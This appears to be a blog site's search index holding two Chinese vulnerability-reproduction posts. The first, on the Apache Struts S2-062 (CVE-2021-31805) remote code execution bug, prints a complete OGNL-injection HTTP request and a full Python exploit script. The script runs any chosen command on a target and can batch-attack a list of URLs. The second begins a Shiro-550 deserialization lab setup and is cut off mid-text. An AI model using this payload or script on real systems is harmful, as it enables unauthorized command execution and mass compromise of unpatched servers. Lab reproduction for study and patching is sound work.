<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>S2-062(CVE-2021-31805)漏洞复现</title>
      <link href="/2022/04/17/S2-062%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/17/S2-062%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>针对 CVE-2020-17530 发布的修复不完整。因此，从 Apache Struts 2.0.0 到 2.5.29，如果开发人员通过使用 %{…} 语法应用强制 OGNL 评估，仍然有一些标签的属性可以执行双重评估。<strong>对不受信任的用户输入使用强制 OGNL 评估可能会导致远程代码执行漏洞。</strong></p><h2 id="漏洞影响版本范围"><a href="#漏洞影响版本范围" class="headerlink" title="漏洞影响版本范围"></a>漏洞影响版本范围</h2><p>2.0.0 ≤ Apache Struts ≤2.5.29</p><p>Struts ≥ 2.5.30的版本不受影响</p><span id="more"></span><h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>目前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本，下载链接：</p><p><a href="https://struts.apache.org/download.cgi#struts-ga">https://struts.apache.org/download.cgi#struts-ga</a></p><h2 id="漏洞环境搭建-docker环境"><a href="#漏洞环境搭建-docker环境" class="headerlink" title="漏洞环境搭建(docker环境)"></a>漏洞环境搭建(docker环境)</h2><p>使用vulhub&#x2F;struts2&#x2F;s2-061&#x2F;<br>版本:struts2.5.25</p><p>GitHub链接：</p><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-061">https://github.com/vulhub/vulhub/tree/master/struts2/s2-061</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>note:经过对外国老哥文章的研究，以及观察网上老哥们的exp，我感觉这个漏洞的利用，应该是针对“传入的参数被通过OGNL展示在页面上且符合s2漏洞版本的目标”。</p><p>比如目标通过get传参传入了name&#x3D;alice，并把alice这个名字打印在页面的某个位置，那就把数据包里的name&#x3D;”id”改为name&#x3D;”name”去利用。</p><p>下面的漏洞复现使用的环境传的参数为id（id被OGNL解析展示在页面上），所以数据包里用的是name&#x3D;”id”。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /index.action HTTP/1.1</span><br><span class="line">Host: 192.168.188.128:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 1095</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&#123;</span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.map=<span class="comment">#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.map.setBean(<span class="comment">#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.map2=<span class="comment">#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.map2.setBean(<span class="comment">#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.map3=<span class="comment">#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.map3.setBean(<span class="comment">#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.get(<span class="string">&#x27;map3&#x27;</span>).put(<span class="string">&#x27;excludedPackageNames&#x27;</span>,<span class="comment">#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">request.get(<span class="string">&#x27;map3&#x27;</span>).put(<span class="string">&#x27;excludedClasses&#x27;</span>,<span class="comment">#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +</span></span></span><br><span class="line"><span class="meta prompt_">(#</span><span class="language-bash">application.get(<span class="string">&#x27;org.apache.tomcat.InstanceManager&#x27;</span>).newInstance(<span class="string">&#x27;freemarker.template.utility.Execute&#x27;</span>).<span class="built_in">exec</span>(&#123;<span class="string">&#x27;id&#x27;</span>&#125;))</span></span><br><span class="line">&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF—</span><br></pre></td></tr></table></figure><p><img src="https://credink.github.io/2022/04/17/S2-062%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1650179084574.png"></p><p><img src="https://credink.github.io/2022/04/17/S2-062%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1650179277355.png"></p><h2 id="漏洞测试脚本"><a href="#漏洞测试脚本" class="headerlink" title="漏洞测试脚本"></a>漏洞测试脚本</h2><p>python s2-062.py –url 目标 [–cmd 命令]</p><p>不指定命令的时候仅做poc测试（测试命令id的响应），<strong>使用–list可以指定txt里的目标批量测试</strong></p><p><img src="https://credink.github.io/2022/04/17/S2-062%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1650182025974.png"></p><p>s2-062.py源码（参考修改自：<a href="https://github.com/YanMu2020/s2-062/blob/main/s2-062.py%EF%BC%89">https://github.com/YanMu2020/s2-062/blob/main/s2-062.py）</a>:</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">from lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">def poc(url):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers <span class="operator">=</span> &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;</span>&#125;</span><br><span class="line">        data <span class="operator">=</span> <span class="string">&quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF<span class="subst">\r</span><span class="subst">\n</span>Content-Disposition: form-data; name=<span class="subst">\&quot;</span>id<span class="subst">\&quot;</span><span class="subst">\r</span><span class="subst">\n</span><span class="subst">\r</span><span class="subst">\n</span>%&#123;<span class="subst">\r</span><span class="subst">\n</span>(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))<span class="subst">\r</span><span class="subst">\n</span>&#125;<span class="subst">\r</span><span class="subst">\n</span>------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94&quot;</span></span><br><span class="line">        text<span class="operator">=</span>requests.post(url, headers<span class="operator">=</span>headers, data<span class="operator">=</span>data, verify<span class="operator">=</span><span class="type">False</span>, timeout<span class="operator">=</span><span class="number">6</span>).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;uid=&quot;</span> <span class="keyword">in</span> text and <span class="string">&quot;) gid=&quot;</span> <span class="keyword">in</span> text and <span class="string">&quot;) groups=&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;发现漏洞&quot;</span>)</span><br><span class="line">            page<span class="operator">=</span>etree.<span class="type">HTML</span>(text)</span><br><span class="line">            data <span class="operator">=</span> page.xpath(&#x27;<span class="comment">//a[@id]/@id&#x27;)</span></span><br><span class="line">            <span class="built_in">print</span>(data[<span class="number">0</span>])</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;POC检测失败&quot;</span>)</span><br><span class="line"></span><br><span class="line">def batchpoc(lst):</span><br><span class="line">    with <span class="keyword">open</span>(lst) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            url <span class="operator">=</span> line.strip(&#x27;\n&#x27;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;http&quot;</span> <span class="operator">!=</span> url[:<span class="number">4</span>]:</span><br><span class="line">                url <span class="operator">=</span> <span class="string">&quot;http://&quot;</span><span class="operator">+</span>url</span><br><span class="line">            <span class="built_in">print</span>(url<span class="operator">+</span><span class="string">&quot;:&quot;</span>)</span><br><span class="line">            poc(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="type">EXP</span>(url,cmd):</span><br><span class="line">    try:</span><br><span class="line">        headers <span class="operator">=</span> &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&quot;</span>&#125;</span><br><span class="line">        data <span class="operator">=</span><span class="string">&quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF<span class="subst">\r</span><span class="subst">\n</span>Content-Disposition: form-data; name=<span class="subst">\&quot;</span>id<span class="subst">\&quot;</span><span class="subst">\r</span><span class="subst">\n</span><span class="subst">\r</span><span class="subst">\n</span>%&#123;<span class="subst">\r</span><span class="subst">\n</span>(#request.map=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map.setBean(#request.get(&#x27;struts.valueStack&#x27;)) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map2=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map2.setBean(#request.get(&#x27;map&#x27;).get(&#x27;context&#x27;)) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map3=#@org.apache.commons.collections.BeanMap@&#123;&#125;).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.map3.setBean(#request.get(&#x27;map2&#x27;).get(&#x27;memberAccess&#x27;)) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.get(&#x27;map3&#x27;).put(&#x27;excludedPackageNames&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#request.get(&#x27;map3&#x27;).put(&#x27;excludedClasses&#x27;,#@org.apache.commons.collections.BeanMap@&#123;&#125;.keySet()) == true).toString().substring(0,0) +<span class="subst">\r</span><span class="subst">\n</span>(#application.get(&#x27;org.apache.tomcat.InstanceManager&#x27;).newInstance(&#x27;freemarker.template.utility.Execute&#x27;).exec(&#123;&#x27;id&#x27;&#125;))<span class="subst">\r</span><span class="subst">\n</span>&#125;<span class="subst">\r</span><span class="subst">\n</span>------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94&quot;</span>.replace(<span class="string">&quot;exec(&#123;&#x27;id&quot;</span>,<span class="string">&quot;exec(&#123;&#x27;&quot;</span><span class="operator">+</span>cmd)</span><br><span class="line">        text<span class="operator">=</span>requests.post(url, headers<span class="operator">=</span>headers, data<span class="operator">=</span>data, verify<span class="operator">=</span><span class="type">False</span>, timeout<span class="operator">=</span><span class="number">6</span>).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;id&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;命令回显&quot;</span>)</span><br><span class="line">            page<span class="operator">=</span>etree.<span class="type">HTML</span>(text)</span><br><span class="line">            data <span class="operator">=</span> page.xpath(&#x27;<span class="comment">//a[@id]/@id&#x27;)</span></span><br><span class="line">            <span class="built_in">print</span>(data[<span class="number">0</span>])</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;EXP检测失败&quot;</span>)</span><br><span class="line"></span><br><span class="line">def batchEXP(lst,cmd):</span><br><span class="line">    with <span class="keyword">open</span>(lst) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            url <span class="operator">=</span> line.strip(&#x27;\n&#x27;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;http&quot;</span> <span class="operator">!=</span> url[:<span class="number">4</span>]:</span><br><span class="line">                url <span class="operator">=</span> <span class="string">&quot;http://&quot;</span><span class="operator">+</span>url</span><br><span class="line">            <span class="built_in">print</span>(url<span class="operator">+</span><span class="string">&quot;:&quot;</span>)</span><br><span class="line">            <span class="type">EXP</span>(url,cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ <span class="operator">==</span> &#x27;__main__&#x27;:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">    parser <span class="operator">=</span> argparse.<span class="type">ArgumentParser</span>(description<span class="operator">=</span>&#x27;<span class="type">S2</span><span class="operator">-</span><span class="number">062</span>验证&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;<span class="operator">--</span>list&#x27;, help<span class="operator">=</span><span class="string">&quot;要验证的URL清单，保存为txt格式&quot;</span>,<span class="keyword">default</span><span class="operator">=</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">    parser.add_argument(&#x27;<span class="operator">--</span>url&#x27;, help<span class="operator">=</span><span class="string">&quot;要验证的URL&quot;</span>,<span class="keyword">default</span><span class="operator">=</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">    parser.add_argument(&#x27;<span class="operator">--</span>cmd&#x27;,help<span class="operator">=</span><span class="string">&quot;你想执行的命令&quot;</span>,<span class="keyword">default</span><span class="operator">=</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">    args <span class="operator">=</span> parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.cmd <span class="operator">!=</span><span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url <span class="operator">!=</span> <span class="string">&quot;&quot;</span> and args.list <span class="operator">==</span> <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="type">EXP</span>(args.url,args.cmd)</span><br><span class="line">        elif args.url <span class="operator">==</span> <span class="string">&quot;&quot;</span> and args.list <span class="operator">!=</span> <span class="string">&quot;&quot;</span>:</span><br><span class="line">            batchEXP(args.list,args.cmd)</span><br><span class="line">        else:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请检查参数&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(args)</span><br><span class="line">    else:</span><br><span class="line">        <span class="keyword">if</span> args.url <span class="operator">!=</span> <span class="string">&quot;&quot;</span> and args.list <span class="operator">==</span> <span class="string">&quot;&quot;</span>:</span><br><span class="line">            poc(args.url)</span><br><span class="line">        elif args.url <span class="operator">==</span> <span class="string">&quot;&quot;</span> and args.list <span class="operator">!=</span> <span class="string">&quot;&quot;</span>:</span><br><span class="line">            batchpoc(args.list)</span><br><span class="line">        else:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请检查参数&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(args)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html">https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html</a></p><p><a href="https://www.ddosi.org/cve-2021-31805/">https://www.ddosi.org/cve-2021-31805/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro550分析</title>
      <link href="/2022/04/10/shiro550%E5%88%86%E6%9E%90/"/>
      <url>/2022/04/10/shiro550%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><ul><li>影响版本 Shiro &lt;&#x3D; 1.2.4</li></ul><span id="more"></span> <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>java1.8+Tomcat8+shiro-root-1.2.4</p><p>使用Apache Shiro Quickstart示例页面进行测试（shiro&#x2F;samples&#x2F;web）</p><h2 id="下载配置shiro"><a href="#下载配置shiro" class="headerlink" title="下载配置shiro"></a>下载配置shiro</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">git checkout shiro-root-1.2.4  #切换分支</span><br></pre></td></tr></table></figure><p>编辑shiro&#x2F;samples&#x2F;web&#x2F;pom.xml，修改jstl的版本为1.2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">&lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>编辑shiro&#x2F;pom.xml，修改toolchains对应的jdk版本为1.8（默认是1.6）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;maven-toolchains-plugin&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">  &lt;configuration&gt;</span><br><span class="line">&lt;toolchains&gt;</span><br><span class="line">  &lt;jdk&gt;</span><br><span class="line">&lt;version&gt;1.8&lt;/version&gt;</span><br><span class="line">&lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">  &lt;/jdk&gt;</span><br><span class="line">&lt;/toolchains&gt;               </span><br><span class="line">  &lt;/configuration&gt;</span><br><span class="line">  &lt;executions&gt;</span><br><span class="line">&lt;execution&gt;</span><br><span class="line">  &lt;goals&gt;</span><br><span class="line">&lt;goal&gt;toolchain&lt;/goal&gt;</span><br><span class="line">  &lt;/goals&gt;</span><br><span class="line">&lt;/execution&gt;</span><br><span class="line">  &lt;/executions&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p>有些文章里为了方便演示shiro的原理（讲解shiro时可以先忽略依赖问题，专心讲shiro的漏洞点），把CC依赖也写进shiro&#x2F;pom.xml里了，在&lt;dependencies&gt;&lt;&#x2F;dependencies&gt;内部塞依赖就行，例如下面加入CC4：</p><p>note:我这里仅作演示，实际操作并没有加入CC4依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>如图所示，添加CC4依赖，同时能看到shiro里自带commons-beanutils依赖：</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407211656478.png"></p><p>打开C:\Users\用户名\.m2\，创建toolchains.xml，并写入下面的内容（jdkHome修改为自己的jdk文件夹路径）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;toolchains xmlns=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd&quot;&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.8&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk1.8.0_202\&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">&lt;/toolchains&gt;</span><br></pre></td></tr></table></figure><h2 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h2><p>Run-&gt;Edit Configurations（左上角加号，选择tomcat local）</p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407212620016.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407212903204.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407213331902.png"></p><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407213354928.png"></p><h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><p><img src="https://credink.github.io/2022/04/10/shiro550%E5%88%86%E6%9E%90/image-20220407213433874.png"></p><p>访问<code>http://127.0.0.1:8080/samples_web_war_exploded/</code></p><p><img 